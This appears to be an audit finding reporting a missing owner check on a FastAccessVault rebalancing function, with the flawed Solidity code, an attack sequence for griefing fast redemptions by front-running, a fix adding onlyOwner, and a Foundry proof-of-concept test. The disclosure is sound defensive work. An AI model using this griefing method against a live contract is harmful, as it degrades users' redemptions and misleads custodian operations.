      "body": "## Finding description and impact\n\nThe `FastAccessVault` contract is the on‑chain DLF buffer used to provide instant redemptions for iTRY holders. It is designed to maintain a configurable buffer of DLF on‑chain while the remainder is held by an off‑chain custodian. The `rebalanceFunds` function is responsible for keeping this buffer at a target level by either:\n\n- Emitting a `TopUpRequestedFromCustodian` event if the buffer is below target, or\n- Transferring excess DLF from the vault to the `custodian` address if the buffer is above target.\n\nThe interface and docstring for `rebalanceFunds` explicitly state that it is “Only callable by owner”:\n\n```solidity\n// src/protocol/interfaces/IFastAccessVault.sol\n/**\n * @notice Rebalance the vault to match target buffer levels\n * @dev Only callable by owner. Requests top-up from custodian if under target,\n *      or transfers excess to custodian if over target\n */\nfunction rebalanceFunds() external;\n```\nHowever, the implementation in `FastAccessVault` does not enforce this. The function is exposed as:\n```solidity\n// src/protocol/FastAccessVault.sol:164+\nfunction rebalanceFunds() external {\n    uint256 aumReferenceValue = _issuerContract.getCollateralUnderCustody();\n    uint256 targetBalance = _calculateTargetBufferBalance(aumReferenceValue);\n    uint256 currentBalance = _vaultToken.balanceOf(address(this));\n\n    if (currentBalance < targetBalance) {\n        uint256 needed = targetBalance - currentBalance;\n        // Emit event for off-chain custodian to process\n        emit TopUpRequestedFromCustodian(address(custodian), needed, targetBalance);\n    } else if (currentBalance > targetBalance) {\n        uint256 excess = currentBalance - targetBalance;\n        if (!_vaultToken.transfer(custodian, excess)) {\n            revert CommonErrors.TransferFailed();\n        }\n        emit ExcessFundsTransferredToCustodian(address(custodian), excess, targetBalance);\n    }\n}\n```\nThere is no `onlyOwner` modifier or any other restriction on the caller. This means **any address** can call `rebalanceFunds`.\n\nThe behavior of `rebalanceFunds` is directly relevant to user redemptions because the issuer decides whether to serve redemptions from the buffer or via the custodian based on the vault’s on‑chain balance:\n```solidity\n// src/protocol/iTryIssuer.sol:353+\nuint256 bufferBalance = liquidityVault.getAvailableBalance();\n\nif (bufferBalance >= grossDlfAmount) {\n    // Buffer has enough - serve from buffer\n    _redeemFromVault(recipient, netDlfAmount, feeAmount);\n    fromBuffer = true;\n} else {\n    // Buffer insufficient - serve from custodian\n    _redeemFromCustodian(recipient, netDlfAmount, feeAmount);\n    fromBuffer = false;\n}\n```\nWhen `currentBalance > targetBalance`, `rebalanceFunds` transfers `excess = currentBalance - targetBalance` to the custodian address. By calling this function at the right time, an unprivileged attacker can:\n\n1. Detect that the vault currently holds more than its target (e.g., after a custodian top‑up or a period of low redemptions).\n2. Call `rebalanceFunds` from their own address (`attacker`), which will:\n- Push all excess DLF from the vault to the custodian.\n- Reduce `getAvailableBalance()` to exactly `targetBalance`.\n3. Immediately after, large user redemptions that would have been served entirely from the buffer may now see `bufferBalance < grossDlfAmount` and be forced down the `_redeemFromCustodian` path instead of the fast on‑chain path.\n\nThis has several concrete impacts:\n\n- **Denial‑of‑service on “fast access”**\nAny user with no special permissions can repeatedly call `rebalanceFunds` to keep the buffer close to its target, reducing the likelihood that large redemptions can be served from the vault. Those redemptions are instead routed to the custodian path, which is inherently slower and dependent on off‑chain actions, contradicting the design goal of a “Fast Access Vault”.\n\n- **Griefing and UX degradation**\nAn attacker can monitor the mempool and call `rebalanceFunds` just before large redemptions are included in a block, systematically forcing them into the custodian path despite ample on‑chain liquidity being available at the time users submitted their transactions. This is a clean griefing vector: the attacker pays only gas and does not need to hold any DLF or iTRY.\n\n- **Confusion for off‑chain processes**\nBecause the interface states `rebalanceFunds` is owner‑only, custodian infrastructure and monitoring systems are likely to treat `TopUpRequestedFromCustodian` and `ExcessFundsTransferredToCustodian` events as authoritative signals from the protocol operator. In reality, these events can be triggered by any address. This can lead to miscalibrated off‑chain behavior (e.g., sending funds in response to an event triggered by an attacker, or misinterpreting vault state).\n\nWhile this bug does not allow an attacker to steal funds—the DLF always goes from the vault to the protocol‑defined `custodian` address—it materially weakens the protocol’s liquidity guarantees and gives an unprivileged party a lever to sabotage user redemptions.\n\nThis is a **Medium‑severity** issue: it is permissionless, impacts core user‑visible functionality (instant redemption), and contradicts the documented access‑control assumptions.\n\n## Recommended mitigation steps\nThe fix should align the implementation with the documented access control and remove the griefing vector:\n\n **Restrict rebalanceFunds to the vault owner**\n\nAdd onlyOwner to the function:\n```solidity\n// src/protocol/FastAccessVault.sol\nfunction rebalanceFunds() external onlyOwner {\n    uint256 aumReferenceValue = _issuerContract.getCollateralUnderCustody();\n    uint256 targetBalance = _calculateTargetBufferBalance(aumReferenceValue);\n    uint256 currentBalance = _vaultToken.balanceOf(address(this));\n\n    if (currentBalance < targetBalance) {\n        uint256 needed = targetBalance - currentBalance;\n        emit TopUpRequestedFromCustodian(address(custodian), needed, targetBalance);\n    } else if (currentBalance > targetBalance) {\n        uint256 excess = currentBalance - targetBalance;\n        if (!_vaultToken.transfer(custodian, excess)) {\n            revert CommonErrors.TransferFailed();\n        }\n        emit ExcessFundsTransferredToCustodian(address(custodian), excess, targetBalance);\n    }\n}\n```\nThis matches the interface’s “Only callable by owner” contract and ensures that only the protocol’s governance (multisig) can trigger rebalancing actions.",
      "proofOfConcept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {FastAccessVault} from \"../src/protocol/FastAccessVault.sol\";\nimport {IFastAccessVault} from \"../src/protocol/interfaces/IFastAccessVault.sol\";\nimport {CommonErrors} from \"../src/protocol/periphery/CommonErrors.sol\";\nimport {MockERC20} from \"./mocks/MockERC20.sol\";\nimport {MockIssuerContract} from \"./mocks/MockIssuerContract.sol\";\n\ncontract FastAccessVaultRebalancePoCTest is Test {\n    FastAccessVault public vault;\n    MockERC20 public vaultToken;\n    MockIssuerContract public issuerContract;\n    address public owner;\n    address public custodian;\n    address public attacker;\n\n    uint256 constant INITIAL_AUM = 10_000_000e18;\n    uint256 constant DEFAULT_TARGET_BPS = 500; // 5%\n    uint256 constant DEFAULT_MINIMUM = 50_000e18;\n\n    function setUp() public {\n        owner = address(this);\n        custodian = makeAddr(\"custodian\");\n        attacker = makeAddr(\"attacker\");\n\n        vaultToken = new MockERC20(\"Digital Liquidity Fund\", \"DLF\");\n        issuerContract = new MockIssuerContract(INITIAL_AUM);\n\n        vault = new FastAccessVault(\n            address(vaultToken),\n            address(issuerContract),\n            custodian,\n            DEFAULT_TARGET_BPS,\n            DEFAULT_MINIMUM,\n            owner\n        );\n        issuerContract.setVault(address(vault));\n\n        // Overfund the vault relative to target\n        vaultToken.mint(address(vault), 2_000_000e18);\n        // Ensure AUM is set so target reflects INITIAL_AUM\n        issuerContract.setCollateralUnderCustody(INITIAL_AUM);\n    }\n\n    function _calculateExpectedTargetBalance(uint256 aum, uint256 bps, uint256 minimum)\n        internal\n        pure\n        returns (uint256)\n    {\n        uint256 targetFromPercentage = (aum * bps) / 10000;\n        return targetFromPercentage < minimum ? minimum : targetFromPercentage;\n    }\n\n    function test_rebalanceFunds_whenCalledByAttacker_transfersExcessToCustodian() public {\n        uint256 targetBalance = _calculateExpectedTargetBalance(INITIAL_AUM, DEFAULT_TARGET_BPS, DEFAULT_MINIMUM);\n        uint256 excess = 2_000_000e18 - targetBalance;\n\n        uint256 vaultBalanceBefore = vaultToken.balanceOf(address(vault));\n        uint256 custodianBalanceBefore = vaultToken.balanceOf(custodian);\n\n        // Act: unprivileged attacker calls rebalanceFunds\n        vm.prank(attacker);\n        vault.rebalanceFunds();\n\n        // Assert: vault drained to target, custodian received excess\n        uint256 vaultBalanceAfter = vaultToken.balanceOf(address(vault));\n        uint256 custodianBalanceAfter = vaultToken.balanceOf(custodian);\n\n        assertEq(\n            vaultBalanceAfter,\n            targetBalance,\n            \"Attacker-triggered rebalance should reduce vault to target balance\"\n        );\n        assertEq(\n            custodianBalanceAfter,\n            custodianBalanceBefore + excess,\n            \"Custodian should receive the excess even when caller is attacker\"\n        );\n        assertEq(\n            vaultBalanceBefore - vaultBalanceAfter,\n            excess,\n            \"Vault balance reduction should equal excess transferred\"\n        );\n    }\n}\n```\n\n**How this PoC ties back to the vulnerability:**\n\n- The test sets the vault up with an over‑target DLF balance (2,000,000e18) and a known AUM so the target buffer can be computed.\n\n- It then calls `vault.rebalanceFunds()` from `attacker`, which is not the owner.\n  \n- After the call, the test verifies that:\n  - The vault balance has been reduced exactly to the computed `targetBalance`.\n  - The custodian’s balance has increased by exactly the `excess` amount.\n  - The reduction in vault balance matches the amount transferred to custodian.\n\nThis demonstrates that:\n\n- `rebalanceFunds` is callable by any address, not just the vault owner.\n\n- An unprivileged attacker can force the vault to send all excess buffer DLF to the custodian, draining on‑chain liquidity down to the protocol’s target threshold.\n\n- This behavior contradicts the interface’s “Only callable by owner” contract and enables a third party to impact user redemption paths and custodian operations.",
